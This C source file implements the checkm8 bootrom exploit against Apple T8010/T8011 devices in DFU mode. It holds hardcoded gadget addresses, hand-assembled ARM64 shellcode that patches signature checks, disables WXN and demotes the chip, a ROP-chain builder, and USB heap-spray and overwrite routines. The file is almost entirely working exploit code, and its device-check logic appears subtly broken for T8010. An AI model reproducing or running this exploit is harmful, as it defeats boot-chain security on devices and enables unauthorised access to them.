#include <io/iousb.h>
#include <common/common.h>
#include <asm64.h>
#include <exploit/checkm8/t8010.h>

static unsigned char blank[2048];

#define MAX_PAYLOAD_SIZE    (4096)
#define MAX_ROP_SIZE        (2000)
#define MAX_BLOCK_SIZE      (0x50)

static unsigned char payload[MAX_PAYLOAD_SIZE];
size_t payloadLen = 0;

static unsigned char rop_cb[MAX_ROP_SIZE];
size_t callback_size=0;

typedef struct callback_t{
    uint64_t arg0;
    uint64_t arg1;
    struct callback_t *next;
} callback_t;

static callback_t *callback;

static void cb_init(void)
{
    if(callback) {
        callback_t *cb;
        while(callback->next != NULL) {
            cb = callback->next;
            free(callback);
            callback = cb;
        }
        callback = NULL;
    }
    if(!callback) {
        callback = malloc(sizeof(callback_t));
        callback->next = NULL;
    }
}

static void rop_callback(uint64_t arg0, uint64_t arg1)
{
    callback_t *cb = callback;
    while(1) {
        if(cb->next == NULL) {
            cb->arg0 = arg0;
            cb->arg1 = arg1;
            cb->next = malloc(sizeof(callback_t));
            cb->next->next = NULL;
            return;
        }
        cb = cb->next;
    };
}

static int use_rop_callbacks(unsigned char* buf, uint64_t func_gadget, uint64_t address)
{
    callback_t *cb = callback;
    unsigned char block1[MAX_BLOCK_SIZE];
    unsigned char block2[MAX_BLOCK_SIZE];
    size_t block1_len = 0;
    size_t block2_len = 0;
    
    unsigned char data[MAX_BLOCK_SIZE*2];
    size_t len = 0;
    
    int count = 0;
    while(cb->next != NULL) {
        count++;
        cb = cb->next;
    };
    cb = callback;
    
    for(int i=0;i<count;i+=5) {
        memset(&data,   '\0', MAX_BLOCK_SIZE*2);
        memset(&block1, '\0', MAX_BLOCK_SIZE);
        memset(&block2, '\0', MAX_BLOCK_SIZE);
        block1_len = 0;
        block2_len = 0;
        
        for(int j=0;j<5;j++) {
            address += 0x10;
            if(j==4)
                address += 0x50;
            if((i+j) < (count-1)) {
                if(cb->next == NULL)
                    return -1;
                *(uint64_t*)(block1+block1_len) = func_gadget;  block1_len+=8;
                *(uint64_t*)(block1+block1_len) = address;      block1_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg1;     block2_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg0;     block2_len+=8;
                cb = cb->next;
            } else if ((i+j) == (count-1)) {
                if(cb->next == NULL)
                    return -1;
                *(uint64_t*)(block1+block1_len) = func_gadget;  block1_len+=8;
                *(uint64_t*)(block1+block1_len) = 0;            block1_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg1;     block2_len+=8;
                *(uint64_t*)(block2+block2_len) = cb->arg0;     block2_len+=8;
                cb = cb->next;
            } else {
                *(uint64_t*)(block1+block1_len) = 0; block1_len+=8;
                *(uint64_t*)(block1+block1_len) = 0; block1_len+=8;
            }
        }
        
        if(block1_len > MAX_BLOCK_SIZE ||
           block2_len > MAX_BLOCK_SIZE)
            return -1;
        memcpy(data, block1, block1_len);
        memcpy(data+block1_len, block2, block2_len);
        
        if(len+block1_len+block2_len > MAX_ROP_SIZE)
            return -1;
        memcpy(buf+len, data, block1_len+block2_len);
        len += (block1_len+block2_len);
    }
    
    callback_size = len;
    return 0;
}

static unsigned char overwriteBuf[48];
static unsigned int overwriteLen = 48;

static int patch_payload(io_client_t client)
{
    int i=0;
    
    // init
    bool SET_USBDescriptors = false;
    bool isTLBI             = false;
    bool demote_flag        = false;
    
    uint64_t LOAD_ADDRESS = 0;
    
    uint64_t gUSBDescriptors = 0;
    uint64_t gUSBSerialNumber = 0;
    uint64_t usb_create_string_descriptor = 0;
    uint64_t gUSBSRNMStringDescriptor = 0;
    uint64_t gDemotionRegister = 0;
    
    uint64_t PATCH_ADDR = 0;
    uint64_t PATCH_VALUE = 0;
    uint64_t TTBR0_BASE = 0;
    
    uint64_t VROM_PAGE_OFFSET = 0;
    uint64_t SRAM_PAGE_OFFSET = 0;
    
    uint64_t nop_gadget = 0;
    uint64_t func_gadget = 0;
    uint64_t enter_critical_section = 0;
    uint64_t exit_critical_section = 0;
    uint64_t dc_civac = 0;
    uint64_t write_ttbr0 = 0;
    uint64_t tlbi = 0;
    uint64_t dmb = 0;
    
    uint32_t PWND_STR0 = 0x4e575020; // ' PWN'
    uint32_t PWND_STR1 = 0x695b3a44; // 'D:[i'
    uint32_t PWND_STR2 = 0x646e7770; // 'pwnd'
    uint32_t PWND_STR3 = 0x005d7265; // 'er]\x00'
    
    memset(&payload, '\0', 4096);
    memset(&rop_cb, '\0', MAX_ROP_SIZE);
    cb_init();
    
    if(client->devinfo.cpid == 0x8010) {
        LOAD_ADDRESS = 0x1800B0000;
        
        gUSBDescriptors = 0x180088A30;
        gUSBSerialNumber = 0x180083CF8;
        usb_create_string_descriptor = 0x10000D150;
        gUSBSRNMStringDescriptor = 0x1800805DA;
        gDemotionRegister = 0x2102bc000;
        
        PATCH_ADDR = 0x1000074ac;
        PATCH_VALUE = 0xd2800000;
        TTBR0_BASE = 0x1800A0000;
        VROM_PAGE_OFFSET = 0x400;
        SRAM_PAGE_OFFSET = 0x600;
        
        nop_gadget = 0x10000CC6C;
        func_gadget = 0x10000CC4C;
        enter_critical_section = 0x10000A4B8;
        exit_critical_section = 0x10000A514;
        dc_civac = 0x10000046C;
        write_ttbr0 = 0x1000003E4;
        tlbi = 0x100000434;
        dmb = 0x100000478;
    } if(client->devinfo.cpid == 0x8011) {
        LOAD_ADDRESS = 0x1800B0000;
        
        gUSBDescriptors = 0x180088948;
        gUSBSerialNumber = 0x180083D28;
        usb_create_string_descriptor = 0x10000D234;
        gUSBSRNMStringDescriptor = 0x18008062A;
        gDemotionRegister = 0x2102bc000;
        
        PATCH_ADDR = 0x100007630;
        PATCH_VALUE = 0xd2800000;
        TTBR0_BASE = 0x1800A0000;
        VROM_PAGE_OFFSET = 0x400;
        SRAM_PAGE_OFFSET = 0x600;
        
        nop_gadget = 0x10000CD0C;
        func_gadget = 0x10000CCEC;
        dc_civac = 0x10000047C;
        write_ttbr0 = 0x1000003F4;
        tlbi = 0x100000444;
        dmb = 0x100000488;
    } else {
        return -1;
    }
    
    if(client->isDemotion == true) {
        demote_flag = true;
        PWND_STR1 = 0x645b3a44; // 'D:[d'
        PWND_STR2 = 0x746f6d65; // 'emot'
        PWND_STR3 = 0x005d6465; // 'ed]\x00'
    }
    
    memset(&overwriteBuf, '\0', 48);
    *(uint64_t*)(overwriteBuf + 0x20) = nop_gadget;
    *(uint64_t*)(overwriteBuf + 0x28) = LOAD_ADDRESS + 0x800;
    
    // checkm8_arm64.s
    // _checkm8_shellcode:
    *(uint32_t*)(payload+i) = 0xd2800013; i+=4; // mov   x19, #0
    *(uint32_t*)(payload+i) = 0xa9bf7bfd; i+=4; // stp   x29, x30, [sp,#-0x10]!
    *(uint32_t*)(payload+i) = 0x910003fd; i+=4; // mov   x29, sp
    *(uint32_t*)(payload+i) = 0x580006a0; i+=4; // ldr   x0, =SET_USBDescriptors
    *(uint32_t*)(payload+i) = 0xf100041f; i+=4; // cmp   x0, #1
    *(uint32_t*)(payload+i) = 0x54000141; i+=4; // bne   _set_srnm
    
    // _set_USBDescriptors:
    *(uint32_t*)(payload+i) = 0x58000680; i+=4; // LDR   X0, =gUSBDescriptors
    *(uint32_t*)(payload+i) = 0xa9400400; i+=4; // LDP   X0, X1, [X0]
    *(uint32_t*)(payload+i) = 0x10000482; i+=4; // ADR   X2, USB_DESCRIPTOR
    *(uint32_t*)(payload+i) = 0xa9401043; i+=4; // LDP   X3, X4, [X2]
    *(uint32_t*)(payload+i) = 0xa9001003; i+=4; // STP   X3, X4, [X0]
    *(uint32_t*)(payload+i) = 0xa9001023; i+=4; // STP   X3, X4, [X1]
    *(uint32_t*)(payload+i) = 0xa9411043; i+=4; // LDP   X3, X4, [X2,#0x10]
    *(uint32_t*)(payload+i) = 0xa9011003; i+=4; // STP   X3, X4, [X0,#0x10]
    *(uint32_t*)(payload+i) = 0xa9011023; i+=4; // STP   X3, X4, [X1,#0x10]
    
    // _set_srnm:
    *(uint32_t*)(payload+i) = 0x580005a0; i+=4; // ldr   x0, =gUSBSerialNumber
    // _find_zero_loop:
    *(uint32_t*)(payload+i) = 0x91000400; i+=4; // add   x0, x0, #1
    *(uint32_t*)(payload+i) = 0x39400001; i+=4; // ldrb  w1, [x0]
    *(uint32_t*)(payload+i) = 0x35ffffc1; i+=4; // cbnz  w1, _find_zero_loop
    *(uint32_t*)(payload+i) = 0x10000421; i+=4; // adr   x1, PWND_STRING
    *(uint32_t*)(payload+i) = 0xa9400c22; i+=4; // ldp   x2, x3, [x1]
    *(uint32_t*)(payload+i) = 0xa9000c02; i+=4; // stp   x2, x3, [x0]
    *(uint32_t*)(payload+i) = 0x580004c0; i+=4; // ldr   x0, =gUSBSerialNumber
    *(uint32_t*)(payload+i) = 0x580004e1; i+=4; // ldr   x1, =usb_create_string_descriptor
    *(uint32_t*)(payload+i) = 0xd63f0020; i+=4; // blr   x1
    *(uint32_t*)(payload+i) = 0x580004e1; i+=4; // ldr   x1, =gUSBSRNMStringDescriptor
    *(uint32_t*)(payload+i) = 0x39000020; i+=4; // strb  w0, [x1]
    *(uint32_t*)(payload+i) = 0x580004e0; i+=4; // ldr   x0, =demote_flag
    *(uint32_t*)(payload+i) = 0xf100041f; i+=4; // cmp   x0, #1
    *(uint32_t*)(payload+i) = 0x54000141; i+=4; // bne   _end
    
    // _demotion:
    *(uint32_t*)(payload+i) = 0x580004c1; i+=4; // ldr   x1, =gDemotionRegister
    *(uint32_t*)(payload+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
    *(uint32_t*)(payload+i) = 0x7200001f; i+=4; // tst   w0, #1
    *(uint32_t*)(payload+i) = 0x540000c0; i+=4; // beq   _end
    *(uint32_t*)(payload+i) = 0xb9400020; i+=4; // ldr   w0, [x1]
    *(uint32_t*)(payload+i) = 0x121f7800; i+=4; // and   w0, w0, #0xfffffffe
    *(uint32_t*)(payload+i) = 0xb9000020; i+=4; // str   w0, [x1]
    *(uint32_t*)(payload+i) = 0xd5033f9f; i+=4; // dsb   sy
    *(uint32_t*)(payload+i) = 0xd5033fdf; i+=4; // isb
    
    // _end:
    *(uint32_t*)(payload+i) = 0xd508751f; i+=4; // ic    iallu
    *(uint32_t*)(payload+i) = 0xd5033f9f; i+=4; // dsb   sy
    *(uint32_t*)(payload+i) = 0xd5033fdf; i+=4; // isb
    
    *(uint32_t*)(payload+i) = 0xa8c17bfd; i+=4; // ldp   x29, x30, [sp], #0x10
    *(uint32_t*)(payload+i) = 0xd65f03c0; i+=4; // ret
    
    // USB_DESCRIPTOR:
    *(uint32_t*)(payload+i) = 0x00190209; i+=4;
    *(uint32_t*)(payload+i) = 0x80050101; i+=4;
    *(uint32_t*)(payload+i) = 0x000409fa; i+=4;
    *(uint32_t*)(payload+i) = 0x01fe0000; i+=4;
    *(uint32_t*)(payload+i) = 0x21070000; i+=4;
    *(uint32_t*)(payload+i) = 0x00000a01; i+=4;
    *(uint32_t*)(payload+i) = 0x00000008; i+=4;
    *(uint32_t*)(payload+i) = 0x00000000; i+=4;
    
    // PWND_STRING:
    *(uint32_t*)(payload+i) = PWND_STR0; i+=4;
    *(uint32_t*)(payload+i) = PWND_STR1; i+=4;
    *(uint32_t*)(payload+i) = PWND_STR2; i+=4;
    *(uint32_t*)(payload+i) = PWND_STR3; i+=4;

    // OFFSETS
    *(uint64_t*)(payload+i) = SET_USBDescriptors;           i+=8;
    *(uint64_t*)(payload+i) = gUSBDescriptors;              i+=8;
    *(uint64_t*)(payload+i) = gUSBSerialNumber;             i+=8;
    *(uint64_t*)(payload+i) = usb_create_string_descriptor; i+=8;
    *(uint64_t*)(payload+i) = gUSBSRNMStringDescriptor;     i+=8;
    *(uint64_t*)(payload+i) = demote_flag;                  i+=8;
    *(uint64_t*)(payload+i) = gDemotionRegister;            i+=8;
    
    i = 0x200;
    // _sigcheck_patch:
    *(uint32_t*)(payload+i) = 0x58000440; i+=4; // LDR     X0, =PATCH_ADDR
    *(uint32_t*)(payload+i) = 0x18000461; i+=4; // LDR     W1, =PATCH_VALUE
    *(uint32_t*)(payload+i) = 0xb9000001; i+=4; // STR     W1, [X0]
    *(uint32_t*)(payload+i) = 0x14000012; i+=4; // B       _inv_tlbi
    
    // _patch_ttbr_page:
    *(uint32_t*)(payload+i) = 0x58000441; i+=4; // LDR     X1, =TTBR0_BASE
    *(uint32_t*)(payload+i) = 0x58000462; i+=4; // LDR     X2, =PAGE_OFFSET
    *(uint32_t*)(payload+i) = 0x58000483; i+=4; // LDR     X3, =TLBI
    *(uint32_t*)(payload+i) = 0xf8626824; i+=4; // LDR     X4, [X1, X2]
    *(uint32_t*)(payload+i) = 0xd2ec0005; i+=4; // MOV     X5, #0x6000000000000000
    *(uint32_t*)(payload+i) = 0x8a250086; i+=4; // BIC     X6, X4, X5
    *(uint32_t*)(payload+i) = 0xb4000046; i+=4; // CBZ     X6, #_else1
    // _bit62_61:
    *(uint32_t*)(payload+i) = 0xaa050084; i+=4; // ORR     X4, X4, X5, LSL #0
    // _else1:
    *(uint32_t*)(payload+i) = 0x92790086; i+=4; // AND     X6, X4, #0x80
    *(uint32_t*)(payload+i) = 0xb4000046; i+=4; // CBZ     X6, #_patch
    // _bit7:
    *(uint32_t*)(payload+i) = 0xd2790084; i+=4; // EOR     X4, X4, #0x80
    // _patch:
    *(uint32_t*)(payload+i) = 0xf8226824; i+=4; // STR     X4, [X1, X2]
    // _sctlr:
    *(uint32_t*)(payload+i) = 0xd5381004; i+=4; // MRS     X4, SCTLR_EL1
    *(uint32_t*)(payload+i) = 0x926e0086; i+=4; // AND     X6, X4, #0x40000
    *(uint32_t*)(payload+i) = 0xb4000066; i+=4; // CBZ     X6, #_inv_tlbi
    // _bit19:
    *(uint32_t*)(payload+i) = 0xd26e0084; i+=4; // EOR     X4, X4, #0x40000
    *(uint32_t*)(payload+i) = 0xd5181004; i+=4; // MSR     SCTLR_EL1, X4
    // _inv_tlbi:
    *(uint32_t*)(payload+i) = 0xd5033fdf; i+=4; // ISB
    *(uint32_t*)(payload+i) = 0xd5033fbf; i+=4; // DMB     SY
    *(uint32_t*)(payload+i) = 0xd508751f; i+=4; // IC      IALLU
    *(uint32_t*)(payload+i) = 0xd508871f; i+=4; // TLBI    VMALLE1
    *(uint32_t*)(payload+i) = 0x58000223; i+=4; // LDR     X3, =TLBI
    *(uint32_t*)(payload+i) = 0xb5000083; i+=4; // CBNZ    X3, #_alle3
    *(uint32_t*)(payload+i) = 0xd5033f9f; i+=4; // DSB     SY
    *(uint32_t*)(payload+i) = 0xd5033fdf; i+=4; // ISB
    // _ret:
    *(uint32_t*)(payload+i) = 0xd65f03c0; i+=4; // RET
    // _alle3:
    *(uint32_t*)(payload+i) = 0xd50e871f; i+=4; // TLBI    ALLE3
    *(uint32_t*)(payload+i) = 0xd5033f9f; i+=4; // DSB     SY
    *(uint32_t*)(payload+i) = 0xd5033fdf; i+=4; // ISB
    *(uint32_t*)(payload+i) = 0x17fffffc; i+=4; // B       #_ret
    
    // OFFSETS
    *(uint64_t*)(payload+i) = PATCH_ADDR; i+=8;
    *(uint64_t*)(payload+i) = PATCH_VALUE; i+=8;
    *(uint64_t*)(payload+i) = TTBR0_BASE; i+=8;
    *(uint64_t*)(payload+i) = VROM_PAGE_OFFSET; i+=8;
    *(uint64_t*)(payload+i) = isTLBI; i+=8;
    
    i = VROM_PAGE_OFFSET;
    *(uint64_t*)(payload+i) = 0x1000006a5;
    
    i = SRAM_PAGE_OFFSET;
    *(uint64_t*)(payload+i) = 0x60000180000625; i+=8;
    *(uint64_t*)(payload+i) = 0x1800006a5; i+=8;
    
    // _disable_wxn:
    *(uint32_t*)(payload+i) = 0xb26107e1; i+=4; // MOV  X1, #0x180000000
    *(uint32_t*)(payload+i) = 0x91428022; i+=4; // ADD  X2, X1, #0xA0000
    *(uint32_t*)(payload+i) = 0x91189421; i+=4; // ADD  X1, X1, #0x625
    *(uint32_t*)(payload+i) = 0xf9030041; i+=4; // STR  X1, [X2,#0x600]
    *(uint32_t*)(payload+i) = 0xd5033fbf; i+=4; // DMB  SY
    *(uint32_t*)(payload+i) = 0xd28201a0; i+=4; // MOV  X0, #0x100D
    *(uint32_t*)(payload+i) = 0xd5181000; i+=4; // MSR  SCTLR_EL1, X0
    *(uint32_t*)(payload+i) = 0xd5033f9f; i+=4; // DSB  SY
    *(uint32_t*)(payload+i) = 0xd5033fdf; i+=4; // ISB
    *(uint32_t*)(payload+i) = 0xd65f03c0; i+=4; // RET
    
    i = 0x800 + 0x20;
    if(client->devinfo.cpid == 0x8010) {
        rop_callback(dc_civac, LOAD_ADDRESS + SRAM_PAGE_OFFSET);
        rop_callback(dmb, 0);
        rop_callback(enter_critical_section, 0);
        rop_callback(write_ttbr0, LOAD_ADDRESS);
        rop_callback(tlbi, 0);
        rop_callback(LOAD_ADDRESS + 0x2000000 + SRAM_PAGE_OFFSET + 0x10, 0); // disable_wxn()
        rop_callback(write_ttbr0, TTBR0_BASE);
        rop_callback(tlbi, 0);
        if(client->isDemotion != true) {
            rop_callback(LOAD_ADDRESS + 0x210, 0); // patch_ttbr_page()
            rop_callback(LOAD_ADDRESS + 0x200, 0); // sigcheck_patch()
        }
        rop_callback(exit_critical_section, 0);
        rop_callback(LOAD_ADDRESS, 0); // checkm8_shellcode()
    } else if(client->devinfo.cpid == 0x8011) {
        rop_callback(dc_civac, LOAD_ADDRESS + SRAM_PAGE_OFFSET);
        rop_callback(dc_civac, LOAD_ADDRESS);
        rop_callback(dmb, 0);
        rop_callback(write_ttbr0, LOAD_ADDRESS);
        rop_callback(tlbi, 0);
        rop_callback(LOAD_ADDRESS + 0x2000000 + SRAM_PAGE_OFFSET + 0x10, 0); // disable_wxn()
        rop_callback(write_ttbr0, TTBR0_BASE);
        rop_callback(tlbi, 0);
        if(client->isDemotion != true) {
            rop_callback(LOAD_ADDRESS + 0x210, 0); // patch_ttbr_page()
            rop_callback(LOAD_ADDRESS + 0x200, 0); // sigcheck_patch()
        }
        rop_callback(LOAD_ADDRESS, 0); // checkm8_shellcode()
    } else {
        return -1;
    }
    
    use_rop_callbacks(rop_cb, func_gadget, LOAD_ADDRESS + 0x800);
    
    if(i+callback_size > MAX_PAYLOAD_SIZE)
        return -1;
    memcpy(payload+i, rop_cb, callback_size);
    
    payloadLen = i+callback_size;
    
    return 0;
}

static void heap_spray(io_client_t client)
{
    transfer_t result;
    UInt32 wLen;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 2048);
    DEBUGLOG("[%s] (1/7) %x", __FUNCTION__, result.ret);
    usleep(1000);
    
    // For iOS devices (especially older ones)
    // Repeat forever until usb_ctrl_transfer(0x80,6,0x304,0x40a,blank,64) reaches Timeout
    int i=0;
    for(i=0;i<16384;i++){
        wLen = async_usb_ctrl_transfer_with_cancel_noloop(client, 0x80, 6, 0x0304, 0x040a, blank, 192, 1);
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
        if(result.ret != kIOReturnSuccess) break;
    }
    DEBUGLOG("[%s] (2/7) %x, %d", __FUNCTION__, result.ret, i);
    
    for(int i=0;i<64;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    }
    DEBUGLOG("[%s] (3/7) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    DEBUGLOG("[%s] (4/7) %x", __FUNCTION__, result.ret);
    
    for(int i=0;i<16;i++){
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    }
    DEBUGLOG("[%s] (5/7) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    DEBUGLOG("[%s] (6/7) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 193, 1);
    DEBUGLOG("[%s] (7/7) %x", __FUNCTION__, result.ret);
}

static void set_global_state(io_client_t client)
{
    transfer_t result;
    unsigned int val;
    UInt32 sent;
    
    memset(&blank, '\x41', 2048);
    
    val = 1408;
    
    int i=0;
    while((sent = async_usb_ctrl_transfer_with_cancel(client, 0x21, 1, 0x0000, 0x0000, blank, 2048, 0)) >= val){
        i++;
        DEBUGLOG("[%s] (*/*) retry: %x", __FUNCTION__, i);
        usleep(10000);
        result = usb_ctrl_transfer(client, 0x21, 1, 0x0000, 0x0000, blank, 64);
        DEBUGLOG("[%s] (*/*) %x", __FUNCTION__, result.ret);
        usleep(10000);
    }
    
    val += 0x40;
    val -= sent;
    
    DEBUGLOG("[%s] (1/3) sent: %x, val: %x", __FUNCTION__, (unsigned int)sent, val);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, blank, val, 100);
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void heap_occupation(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    result = usb_ctrl_transfer_with_time(client, 2, 3, 0x0000, 128, NULL, 0, 10);
    DEBUGLOG("[%s] (1/3) %x", __FUNCTION__, result.ret);
    usleep(100000);
    
    for(int i=0;i<16;i++){
        //r = async_usb_ctrl_transfer_with_cancel(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 0);
        result = usb_ctrl_transfer_with_time(client, 0x80, 6, 0x0304, 0x040a, blank, 64, 1);
    }
    DEBUGLOG("[%s] (2/3) %x", __FUNCTION__, result.ret);
    usleep(10000);
    
    result = usb_ctrl_transfer_with_time(client, 0, 0, 0x0000, 0x0000, overwriteBuf, overwriteLen, 100);
    DEBUGLOG("[%s] (3/3) %x", __FUNCTION__, result.ret);
}

static void send_abort(io_client_t client)
{
    transfer_t result;
    
    memset(&blank, '\0', 2048);
    
    LOG("[%s] sending abort", __FUNCTION__);
    result = usb_ctrl_transfer_with_time(client, 0x21, 4, 0x0000, 0x0000, NULL, 0, 0);
    DEBUGLOG("[%s] (1/1) %x", __FUNCTION__, result.ret);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 1000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return;
    }
    
    LOG("[%s] Done?!", __FUNCTION__);
    
}

int checkm8_t8010(io_client_t client)
{
    
    if(patch_payload(client) != 0) {
        ERROR("[%s] ERROR: Failed to generate payload!", __FUNCTION__);
        return -1;
    }
    
    memset(&blank, '\0', 2048);
    
    LOG_EXPLOIT_NAME("checkm8");
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 1000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running heap_spray()", __FUNCTION__);
    heap_spray(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_RESET|USB_REENUMERATE, false, 10000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running set_global_state()", __FUNCTION__);
    set_global_state(client);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, false, 500000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    LOG("[%s] running heap_occupation()", __FUNCTION__);
    heap_occupation(client);
    send_payload_no_error(client, payload, payloadLen);
    
    LOG("[%s] reconnecting", __FUNCTION__);
    io_reconnect(&client, 5, DEVICE_DFU, USB_REENUMERATE, true, 100000);
    if(!client) {
        ERROR("[%s] ERROR: Failed to reconnect to device", __FUNCTION__);
        return -1;
    }
    
    if(client->hasSerialStr == false) {
        read_serial_number(client); // For iOS 10 and lower
    }
    
    if(client->hasSerialStr != true) {
        ERROR("[%s] Serial number was not found!", __FUNCTION__);
        return -1;
    }
    
    if(client->devinfo.hasPwnd == true) {
        if(!strcmp(client->devinfo.pwnstr, "demoted")) {
            LOG("[%s] demoted!", __FUNCTION__);
            send_abort(client);
            return 0;
        }
        LOG("[%s] pwned!", __FUNCTION__);
        send_abort(client);
        return 1;
    }
    
    return -1;
}
